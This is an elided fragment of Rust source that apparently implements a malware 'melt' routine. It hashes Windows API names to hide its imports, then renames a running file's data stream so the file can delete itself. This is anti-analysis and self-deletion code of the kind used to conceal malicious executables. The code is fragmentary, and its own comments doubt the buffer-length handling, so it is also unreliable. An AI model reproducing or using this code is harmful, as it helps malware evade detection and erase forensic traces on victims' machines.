...
const HASH_SET_FILE_INFO: u32 = 0x228E9326;
const HASH_GET_MOD_NAME_W: u32 = 0x47702E68;

// Structs
#[repr(C)]
struct FileRenameInfo {
    replace_if_exists: u8, // BOOLEAN
    root_dir: *mut c_void, // HANDLE
...
pub unsafe fn melt() -> Result<(), String> {
    ...
    let handle = create_file(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE, // Important: Share Delete
        ptr::null(),
        OPEN_EXISTING,
        0,
        0
    ...
    if handle == -1 { return Err("E45".into()); }
    ...
    // Size is struct header + name len
    let mut rename_info_buf = [0u8; 1024]; // Enough buffer
    let info = &mut *(rename_info_buf.as_mut_ptr() as *mut FileRenameInfo);
    
    info.replace_if_exists = 0;
    info.root_dir = ptr::null_mut();
    info.file_name_length = (new_stream.len() - 1) as u32 * 2; // Bytes, verify null check
    
    // Copy name
    ptr::copy_nonoverlapping(
        new_stream.as_ptr(), 
        info.file_name.as_mut_ptr(), 
        new_stream.len() - 1 // Don't copy null terminator for struct length? 
        // Windows API acts weird here. Usually explicit length is key. 
    );
    // Actually, let's include null if we want, but length field is strictly bytes.
    ...
    let status = set_info(
        ...
        1024 // Total buffer size or structure size? Structure size including string.
             // sizeof(FILE_RENAME_INFO) - sizeof(WCHAR) + file_name_length
    );
    ...
    // Now the original path points to nothing? No, we renamed the stream.
    // Wait, the DS:S rename moves the DATA stream to the named stream.
    // The "entry" is still there but content is moved.
    ...
    if handle2 == -1 { return Err("E47".into()); }
